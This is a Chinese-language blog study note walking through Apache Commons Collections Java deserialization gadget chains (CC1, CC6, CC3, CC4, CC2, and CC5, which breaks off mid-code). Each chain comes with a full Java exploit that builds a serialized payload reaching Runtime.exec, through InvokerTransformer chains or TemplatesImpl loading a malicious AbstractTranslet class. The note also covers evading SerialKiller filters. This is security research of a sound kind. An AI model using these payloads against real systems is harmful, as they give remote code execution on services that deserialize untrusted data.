---
title: CC链
date: 2023-06-05 21:14:00
tags:
- web
categories:
- [笔记, web笔记]
---

# cc6

## 思路

```
HashMap------------------readObject()
	TiedMapEntry------------------hashCode()
		LazyMap------------------get()
			InvokerTransformer------------------transform()
```

我们依旧从终点想起点推进

这里的终点依旧是`InvokerTransformer.transform`;

![image-20230426204736221](https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230426204736221.png)

通过查阅我们发现`LazyMap.get()`调用了transform方法;

**tips：这条链的思路与原版的cc1比较相似，但是好处在于其不受cc和jdk的版本影响**

![image-20230426204850082](https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230426204850082.png)

这里通过资料查询在`TiedMapEntry.hashCode()`中调用了get方法；

![image-20230426205027358](https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230426205027358.png)

看到hashcode我们其实就回忆起了URLDNS链中的入口类，我们可以利用hashMap中的ReadObject来作为入口；



## 存在的小坑点

- 其一：put在序列化时触发hashcode；

当然这里也遇到同URLDNS反序列化时的相同问题，即在未发生反序列化时就会触发我们所需要的效果，因为调用put后会触发hashmap方法，所以我们需要在中间利用反射进行一个修改从而实现我们的目的；

- 其二：如何在反序列化时进入`LazyMap.get()`的if函数；

![image-20230426211102431](https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230426211102431.png)

我们期望的是反序列化使在断点处触发transform方法但是，在序列化时我们传了一组数据，也就是在反序列化时key值不为空，所以不会进入所以我们需要将我们传入的值删除，来满足我们的触发条件。



## 最终的exp

```java
package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

public class cc6_test {
    public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException, IOException, ClassNotFoundException, NoSuchFieldException {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap<Object, Object> a = new HashMap<>();
        Map<Object, Object> lazyMap = LazyMap.decorate(a, new ConstantTransformer(1));

        TiedMapEntry commit = new TiedMapEntry(lazyMap, "commit");

        HashMap<Object, Object> aaa = new HashMap<>();
        aaa.put(commit, "aaa");
        lazyMap.remove("commit");

        Class c = LazyMap.class;
        Field factoryField = c.getDeclaredField("factory");
        factoryField.setAccessible(true);
        factoryField.set(lazyMap,chainedTransformer);

        serialize(aaa);
        unserialize("ser.bin");
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        objectOutputStream.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(Filename));
        Object result = objectInputStream.readObject();
        return result;
    }
}

```

## 小记

在调试的过程中发现有时候代码无法构造或者写不出来，这个时候我们只需要回头看一看我们的链子，然后再到卡住的地方去查看该类的**构造函数**or我们需要控制的变量（如何实现我们可控）这样思路就会清晰很多；

# cc3

SerialKiller是⼀个Java反序列化过滤器，可以通过⿊名单与⽩名单的⽅式来限制反序列化时允许通过的类，所以为了进行绕过cc3为我们提供了另一种方式进行代码执行；

## 思路分析

### 类加载器的利用

其实，不管是加 载远程class文件，还是本地的class或jar文件，Java都经历的是下面这三个方法调用：

```
ClassLoader----------loadClass()
	ClassLoader----------findClass()
		ClassLoader----------defineClass()
```

defineClass 的作用是处理前面传入的字节码，将其处理成真正的Java类,但是我们需要注意的是defineClass被调用时类对象是不会初始化的，只有当其显示调用其构造函数时，初始化代码才能被执行；

再ClassLoader中defineClass基本都是`protected`和`private`的所以我们需要通过寻找一个类中的某个共有方法来完成我们的想法；最终我们定位到了`TemplatesImpl`类中的` defineTransletClasses()`方法

![image-20230429151729282](https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230429151729282.png)

但是` defineTransletClasses()`方法依旧是私有的所以我们继续寻找其用法，查找时该方法的用法共用三个，但是只有如下方法进行了实例化，所以我们选择了`getTransletInstance()`方法

![image-20230427184341955](https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230427184341955.png)
但是`getTransletInstance()`函数的属性依旧不是`public`,所以我们还需要查找，那个类中的方法是public的且调用了`getTransletInstance()`方法，最终我们找到了`TemplatesImpl`种的`newTransformer`方法调用了`getTransletInstance()`且`newTransformer`方法属性是共有的满足我们的所有期望条件；

![image-20230427184551934](https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230427184551934.png)

到这里我们应该如何利用类加载器加载我们的恶意代码，思路已经捋清了，之后我们需要进行一些细节的完善；



### 类加载器的利用--代码实现

通过观察我们发现`TemplatesImpl`的无参构造为空，故所有的参数需要我们自行赋值

我们此时再次阅读代码看一下我们分别需要给那些参数进行赋值

![image-20230429153438544](https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230429153438544.png)

我们希望代码执行至如上红框位置故`_name`的值就不能为空；

其次我们还需要需要给_bytecodesd传我们的值，这里通过for循环将值传给`_class`之后执行我们恶意构造的.class文件

![image-20230427235706932](https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230427235706932.png)

然后，为了正常执行到我们需要的地方所以`_tfactory`不能为null，否则执行的时候会抛出空指针错误；

![image-20230428000012922](https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230428000012922.png)

按照如上思路我们写出了如下代码：

```java
TemplatesImpl templates = new TemplatesImpl();
        Class tc = templates.getClass();
        Field nameField = tc.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"a");

        Field bytecodesField = tc.getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("E://calc.class"));
        byte[][] codes = {code};
        bytecodesField.set(templates,codes);

        Field tfactoryFiled = tc.getDeclaredField("_tfactory");
        tfactoryFiled.setAccessible(true);
        tfactoryFiled.set(templates,new TransformerFactoryImpl());

        templates.newTransformer();
```

测试的时候我们发现运行的时候报了空指针报错

![image-20230428002631020](https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230428002631020.png)

我们进入类中进行debug找哪里报空指针

![image-20230428004004277](https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230428004004277.png)

ok我们找到了问题存在点，我们有两个解决方案，一是我们给这个变量赋值，二是满足上面if的条件避免其进入else即可；

但根据debug的数据我们发现`_transletIndex`的值是-1也就是说我们赋值完成else之后依旧会抛出异常，这将会影响我们正常执行，所以我们选择方法二满足if条件判断

```java
 if (superClass.getName().equals(ABSTRACT_TRANSLET)) {
                    _transletIndex = i;
                }
                else {
                    _auxClasses.put(_class[i].getName(), _class[i]);
                }
```

此处的if判断满足条件是其父类是`ABSTRACT_TRANSLET`指定的类；

![image-20230428004625943](https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230428004625943.png)

所以此时我们更改我们的clac文件，又因为该类是一个抽象类，所以我们需要实现其抽象方法以及接口中为实现的方法；

```java
//calc.java
package org.example;

import java.io.IOException;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class calc extends AbstractTranslet{
    static {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}

```

改好之后代码就可以成功执行了

```java
public class cc3_test {
    public static void main(String[] args) throws Exception {
        TemplatesImpl templates = new TemplatesImpl();
        Class tc = templates.getClass();
        Field nameField = tc.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"a");

        Field bytecodesField = tc.getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("E://calc.class"));
        byte[][] codes = {code};
        bytecodesField.set(templates,codes);

        Field tfactoryFiled = tc.getDeclaredField("_tfactory");
        tfactoryFiled.setAccessible(true);
        tfactoryFiled.set(templates,new TransformerFactoryImpl());

        templates.newTransformer();

    }
}
```

到这里我们就可以利用如上方法来进行代码执行了；即使没有Runtime我们依旧能够进行代码执行；



### 解决InvokerTransformer被过滤的情况

我们在cc1和cc6种使用了InvokerTransformer（作用类似一个反射的重写我们利用这点进行构造最终实现命令执行），如果InvokerTransformer被ban我们就无法继续执行，故在cc3中我们按照上述思路继续寻找解决了这一问题；

根据上述思路我们只需要调用`TemplatesImpl#newTransformer()`就可以实现代码执行，故我们只需要寻找一个新的类调用该方法即可，然后查询该方法的使用，我们发现了一些问题及查找到的类没有继承反序列化的接口所以我们希望找到的类中的构造方法能够传一些参数，所以最后找到了`TrAXFilter`

![image-20230429155725590](https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230429155725590.png)

并且配合`InstantiateTransformer`的`transform`来实现

![image-20230429160002976](https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230429160002976.png)



## 最后的exp

```java
 TemplatesImpl templates = new TemplatesImpl();
        Class tc = templates.getClass();
        Field nameField = tc.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"a");

        Field bytecodesField = tc.getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("E://calc.class"));
        byte[][] codes = {code};
        bytecodesField.set(templates,codes);

//_tfactory在反序列化时会自动赋值所以可以注释不影响我们的代码执行
//        Field tfactoryFiled = tc.getDeclaredField("_tfactory");
//        tfactoryFiled.setAccessible(true);
//        tfactoryFiled.set(templates,new TransformerFactoryImpl());

        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new TemplatesImpl[]{templates});
//        instantiateTransformer.transform(TrAXFilter.class);
//这里依旧需要使用ChainedTransformer为TrAXFilter调用赋值
                org.apache.commons.collections.Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                        instantiateTransformer
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap<Object, Object> a = new HashMap<>();
        a.put("value","bbb");
        Map<Object, Object> transformedmap = TransformedMap.decorate(a,null,chainedTransformer);

        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor annotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class, Map.class);
        annotationInvocationHandlerConstructor.setAccessible(true);
        Object o = annotationInvocationHandlerConstructor.newInstance(Target.class, transformedmap);
```

## 报错解决

### Exception in thread "main" javax.xml.transform.TransformerConfigurationException: 无法加载 translet 类 'a'。

![image-20230428003033020](https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230428003033020.png)

报错原因是因为.class文件存在问题；

### 解决方案

用idea编译运行的.class文件不要自己再外面编译（我报错的原因是因为本机jdk与idea中的jdk版本不符所以报错）

点击右上角工具再进入如下图目录中的位置既可以获得对应的class文件

![image-20230428003313072](https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230428003313072.png)

# TransformedMap版 CC1

## 链子发现

cc1的最终利用点就是`InvokerTransformer`中的transformer方法，接受一个Object对象，并通过反射的方式执行方法；

![image-20230420223801002](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230420223801002.png)

我们利用`InvokerTransformer`中的transformer方法弹计算器进行一个初步测试

![image-20230420225151769](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230420225151769.png)

ok测试成功，也就是说利用的最后一个位置已经找到了，我们需要继续找到对应的类中的同名函数进行利用

这个时候我们需要逆推，找到那些类中调用了transform方法，且便于我们利用

![image-20230420234858964](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230420234858964.png)

通过查找我们发现有21个方法调用了transform，经过一个个的读取我们发现了我们transformmap可以为我们利用，先看他是因为其多次使用了transform方法所以选择从这里入手

![image-20230420235355079](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230420235355079.png)

我们看一下该类的构造方法

![image-20230421001006012](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230421001006012.png)

和一些关键函数根据大佬的描述这里主要就是对key和value进行一个装饰，我们进行可以利用其静态方法进行变量的赋值

![image-20230421001807370](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230421001807370.png)

但是下一个问题接踵而至，我们如何触发checkSetValue方法，从而执行transform，我们继续跟近源代码

![image-20230421002038025](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230421002038025.png)

发现在`AbstractInputCheckedMapDecorator`中`MapEntry`类的`setValue`方法中调用了`checkSetValue`方法，恰巧`TransformedMap`继承于`AbstractInputCheckedMapDecorator`这个类；

现在我们需要找如何触发setvalue方法，Entry==>在hashmap中指一个键值对，可以通过setkey或setvalue的方式改变key和value的值，这里是对setvalue的一个重写

我们进行一个测试看链子是否能通

如下是实现代码：

![image-20230421004133920](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230421004133920.png)

测试后弹计算器了说明我们的思路没什么问题；

ok此时我们继续寻找，看如何调用`setvalue`,查看用法时发现在` AnnotationInvocationHandler`类中的readObject方法中调用了`setvalue`

![image-20230421111422420](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230421111422420.png)

中`memberValues`调用了setvalue，我们读取其构造方法发现该参数值我们可控

![image-20230421113000784](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230421113000784.png)

这里有几个点需要注意，我们发现这个类并不是一个public的类，所以我们需要利用反射的方式去进行调用，思路如下

![image-20230421125031343](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230421125031343.png)

现在遇到了一些问题1、Runtime并没有继承序列化故不满足序列化条件；2、setvalue中传输的对象并不是我们所期望的对象

## 问题解决

1、Runtime并没有继承序列化故不满足序列化条件（Runtime没有继承Serialize）

```java
//Runtime不能序列化的解决方案===》解决方案：利用class获取runtime最后对Runtime进行反序列化
 Class a = Runtime.class;
 Method method = a.getMethod("getRuntime",null);
 Runtime r = (Runtime) method.invoke(null, null);
 Method execMethod = a.getMethod("exec", String.class);
//计算器测试
 execMethod.invoke(r,"calc");
```

根具上述代码我们将其转换rInvokerTransformer调用的方式

```java
        Method getRuntimeMethod = (Method) new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}).transform(Runtime.class);
        Runtime invokeMethod = (Runtime) new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class}, new Object[]{null, null}).transform(getRuntimeMethod);
        new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"}).transform(invokeMethod);
```

但是上述代码并非最佳选择因为我们多次调用transform方法，这里可以使用ChainedTransformer的transform方法来减少调用次数

![image-20230424195149703](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230424195149703.png)

这里需要注意我们`.transform(Runtime.class);`因为是调用上一个所以我们可以使用ConstantTransformer中的transform方法来输出Runtime.class

```java
//ConstantTransformer中的transform方法
public Object transform(Object input) {
        return iConstant;
    }
```

最终的代码：

```java
Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
```



2、` AnnotationInvocationHandler`类中的setvalue方法的使用

AnnotationInvocationHandler的构造方法：

![image-20230424192652479](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230424192652479.png)

我们看到上面有几个if判断

![image-20230424192243587](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230424192243587.png)

这里的memberType是去找注释类中的成员方法，但是我们使用的`@Override`是没有成员变量的

![image-20230424192857463](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230424192857463.png)

所以我们需要找一个注释中含有成员变量的最终我们锁定了`@Target`

![image-20230424193157726](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230424193157726.png)

这样我们将a中的key值改为value即可调用setvalue方法；

![image-20230424193249678](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230424193249678.png)





## 最终的exp

![image-20230424195404895](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230424195404895.png)

执行效果：

![image-20230424195446264](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230424195446264.png)



最后这里附上所有调试代码

```java
package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

public class Main {
    public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException, ClassNotFoundException, InstantiationException, IOException {
        //利用反射弹计算器
//        Runtime runtime = Runtime.getRuntime();
//        Class a = Runtime.class;
//        Method method = a.getMethod("exec",String.class);
//        method.invoke(runtime,"calc");

        //利用InvokerTransformer弹计算器
//        Runtime runtime = Runtime.getRuntime();
//        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"}).transform(runtime);

        //利用TransformedMap弹计算器
//        Runtime runtime = Runtime.getRuntime();
//        InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
//        HashMap<Object, Object> a = new HashMap<>();
//        a.put("aaa","bbb");
//        Map<Object, Object> transformedmap = TransformedMap.decorate(a,null,invokerTransformer);
//
//        for (Map.Entry entry:transformedmap.entrySet()) {
//            entry.setValue(runtime);
//        }

        //缕清思路
//        Runtime runtime = Runtime.getRuntime();
//        InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
//        HashMap<Object, Object> a = new HashMap<>();
//        a.put("aaa","bbb");
//        Map<Object, Object> transformedmap = TransformedMap.decorate(a,null,invokerTransformer);
//
//        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
//        Constructor annotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class, Map.class);
//        annotationInvocationHandlerConstructor.setAccessible(true);
//        Object o = annotationInvocationHandlerConstructor.newInstance(Override.class, invokerTransformer);


        //Runtime不能序列化的解决方案===》解决方案：利用class获取runtime最后对Runtime进行反序列化
        //如利用反射机制完成弹计算器
//        Class a = Runtime.class;
//        Method method = a.getMethod("getRuntime",null);
//        Runtime r = (Runtime) method.invoke(null, null);
//        Method execMethod = a.getMethod("exec", String.class);
//        execMethod.invoke(r,"calc");

        //实现Method method = a.getMethod("getRuntime",null);
//        Method getRuntimeMethod = (Method) new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}).transform(Runtime.class);
//        Runtime invokeMethod = (Runtime) new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class}, new Object[]{null, null}).transform(getRuntimeMethod);
//        new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"}).transform(invokeMethod);

        //优化减少transform的调用次数
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        //简单调试确定能执行弹计算器
        //chainedTransformer.transform(Runtime.class);
        HashMap<Object, Object> a = new HashMap<>();
        a.put("value","bbb");
        Map<Object, Object> transformedmap = TransformedMap.decorate(a,null,chainedTransformer);
        //到此我们已经将Runtime不能反序列化的问题解决了，解析来我们需要解决第二个问题了
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor annotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class, Map.class);
        annotationInvocationHandlerConstructor.setAccessible(true);
        Object o = annotationInvocationHandlerConstructor.newInstance(Target.class, transformedmap);

        serialize(o);
        unserialize("ser.bin");
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        objectOutputStream.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(Filename));
        Object result = objectInputStream.readObject();
        return result;
    }
}
```

# cc4

## 环境配置

依赖配置

```xml
 <dependency>
            <groupId>org.apache.commons</groupId>
            <artifactId>commons-collections4</artifactId>
            <version>4.0</version>
        </dependency>
```

**tips:使用双版本的师傅们需要注意，在写的时候导入的包是否真确**

![image-20230430171456418](https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230430171456418.png)

## 代码分析

我们最后依旧是走到这来实现代码执行

![image-20230430172042795](https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230430172042795.png)

所以需要向前“拼装”我们的链子

我们从cc4中的ChainedTransformer中入手寻找谁使用了其transform方法

![image-20230430172457647](https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230430172457647.png)

如上我们在`TransformingComparator`中找到了，其compare方法中有调用transform，并且该类继承了Serializable接口，其属于java中较为常用的类；

之后我们继续找谁调了compare，最终我们定位到了`PriorityQueue`中ReadObject方法中的heapify()

```java
//具体过程
heapify()-->siftDown()-->siftDownUsingComparator()-->compare()
```

详细过程

![image-20230430174040696](https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230430174040696.png)

**tips:在cc3中不使用`TransformingComparator`是因为其没有实现Serializable接口**

我们的思路滤清了接下来就是代码实现了

我们在`TransformingComparator`中调用transform，回头看其构造函数，有参构造我们能够赋值

![image-20230430174347376](https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230430174347376.png)

接着就是将其放入优先队列

![image-20230430174639340](https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230430174639340.png)

我们发现我们可以利用其构造函数传值；

```java
  TemplatesImpl templates = new TemplatesImpl();
        Class tc = templates.getClass();
        Field nameField = tc.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"a");

        Field bytecodesField = tc.getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("E://calc.class"));
        byte[][] codes = {code};
        bytecodesField.set(templates,codes);

        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new TemplatesImpl[]{templates});

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                instantiateTransformer
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);
        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);

        serialize(priorityQueue);
        unserialize("ser.bin");
```

到这我们的思路已经通过了但运行并没有弹计算器，所以我么进行跟进寻找错误点

![image-20230430175005989](https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230430175005989.png)

这里进行了一个以为操作我们的队列为空无法进入for循环所以无法调用`siftDown`;

```java
priorityQueue.add(1);
priorityQueue.add(2);
```

![image-20230430175744505](https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230430175744505.png)

这里我们赋值即可解决但是运行发现依旧报错；原因是在add时调用了compare方法，这也就意味着在本地执行，所以我们传入一个无用的对象在最后通过反射传入我们恶意构造的类；

### 最终exp

```java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class cc4_test {
    public static void main(String[] args) throws Exception {
        TemplatesImpl templates = new TemplatesImpl();
        Class tc = templates.getClass();
        Field nameField = tc.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"a");

        Field bytecodesField = tc.getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("E://calc.class"));
        byte[][] codes = {code};
        bytecodesField.set(templates,codes);

        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new TemplatesImpl[]{templates});

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                instantiateTransformer
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1));

        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);
        priorityQueue.add(1);
        priorityQueue.add(2);

        Class a = TransformingComparator.class;
        Field transformerFiled = a.getDeclaredField("transformer");
        transformerFiled.setAccessible(true);
        transformerFiled.set(transformingComparator,chainedTransformer);

        serialize(priorityQueue);
        unserialize("ser.bin");
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        objectOutputStream.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(Filename));
        Object result = objectInputStream.readObject();
        return result;
    }
}

```





# cc2

cc2和cc4的思路差不多，只是换条路子走

![image-20230430193412693](https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230430193412693.png)

我们通过`InvokerTransformer`的transform方法来实现

##  最终exp

```java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class cc2_test {
    public static void main(String[] args) throws Exception{
        TemplatesImpl templates = new TemplatesImpl();
        Class tc = templates.getClass();
        Field nameField = tc.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"a");

        Field bytecodesField = tc.getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("E://calc.class"));
        byte[][] codes = {code};
        bytecodesField.set(templates,codes);

        InvokerTransformer<Object, Object> newTransformer = new InvokerTransformer<>("newTransformer", new Class[]{}, new Object[]{});
        TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1));

        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);
        priorityQueue.add(templates);
        priorityQueue.add(templates);

        Class a = TransformingComparator.class;
        Field transformerFiled = a.getDeclaredField("transformer");
        transformerFiled.setAccessible(true);
        transformerFiled.set(transformingComparator,newTransformer);

        serialize(priorityQueue);
        unserialize("ser.bin");
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        objectOutputStream.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(Filename));
        Object result = objectInputStream.readObject();
        return result;
    }
}

```

ysoserial中避免提前执行的方法是传入toString方法再通过反射的方式传值

![image-20230430195651159](https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230430195651159.png)

**cc2有一个特点即没有用到transform数组，当然不是只有其一条链可以不使用数组**



# cc5

## 环境配置

```xml
        <dependency>
            <groupId>commons-collections</groupId>
            <artifactId>commons-collections</artifactId>
            <version>3.2.1</version>
        </dependency>
```



## 代码分析

这里可以看到其后半部分和cc1是一样的，所以这里只是给了我们另一个入口的思路

![image-20230430200209278](https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230430200209278.png)

我们可以通过`BadAttributeValueExpException`类中的readObject，调用toString

![image-20230430200615962](https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230430200615962.png)

然后再利用`TiedMapEntry`的getValue方法

![image-20230430200649072](https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230430200649072.png)

这样我们就能与cc1的后半段完美拼接

## 最终exp

```java
package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
